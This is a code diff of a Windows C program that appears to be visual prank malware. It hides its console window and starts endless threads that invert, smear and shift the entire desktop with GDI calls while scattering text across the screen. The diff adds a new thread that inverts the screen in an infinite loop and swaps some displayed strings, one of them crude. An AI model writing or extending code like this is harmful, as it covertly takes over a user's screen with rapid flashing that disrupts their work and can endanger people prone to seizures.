@@ -82,12 +82,11 @@ static void p1() {
         SelectObject(hdc, b);
         PatBlt(hdc, rand() % x, rand() % y, rand() % x, rand() % y, PATINVERT);
         PatBlt(hdc, 0, 0, x, y, PATINVERT);
-        PatBlt(hdc, 0, 0, x, y, DSTINVERT);
         StretchBlt(hdc, 0, 0, rand() % 3 + x, rand() % 3 + y, hdc, 0, 0, x, y, SRCPAINT);
         SetBkColor(hdc, rand_color());
         SetTextColor(hdc, rand_color());
         TextOut(hdc, rand() % x, rand() % y, L":O", 2);
-        TextOut(hdc, rand() % x, rand() % y, L"JPEGMAFIA", 10);
+        TextOut(hdc, rand() % x, rand() % y, L"VVV VVV VVV VVV", 16);
         BitBlt(hdc, rand() % 100 - 50, rand() % 100 - 50, x, y, hdc, 0, 0, SRCCOPY);
         BitBlt(hdc, 20, 0, x, y, hdc, 0, 0, SRCCOPY);
         BitBlt(hdc, -20, 0, x, y, hdc, 0, 0, SRCCOPY);
@@ -152,7 +151,7 @@ static void p2() {
         SetBkColor(hdc, rand_color());
         SetTextColor(hdc, rand_color());
         TextOut(hdc, rand() % x, rand() % y, L">w<", 3);
-        TextOut(hdc, cpos.x, cpos.y, L"SCARING THE HOES", 17);
+        TextOut(hdc, cpos.x, cpos.y, L"LSD", 4);
     }
     ReleaseDC(GetDesktopWindow(), hdc);
 }
@@ -226,6 +225,14 @@ static void p3() {
     }
 }
 
+static void invert() {
+    for (;;) {
+        int x = GetSystemMetrics(0);
+        int y = GetSystemMetrics(1);
+        BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, DSTINVERT);
+    }
+}
+
 static void run_payload(int seconds, LPTHREAD_START_ROUTINE function) {
     HANDLE threadhandle = CreateThread(0, 0, function, 0, 0, 0);
     Sleep(seconds * 1000);
@@ -258,6 +265,7 @@ static void set_title() {
 int main() {
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     FreeConsole();
+    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)invert, 0, 0, 0);
     CreateThread(0, 0, (LPTHREAD_START_ROUTINE)set_title, 0, 0, 0);
     int time = 25;
     for (;;) {
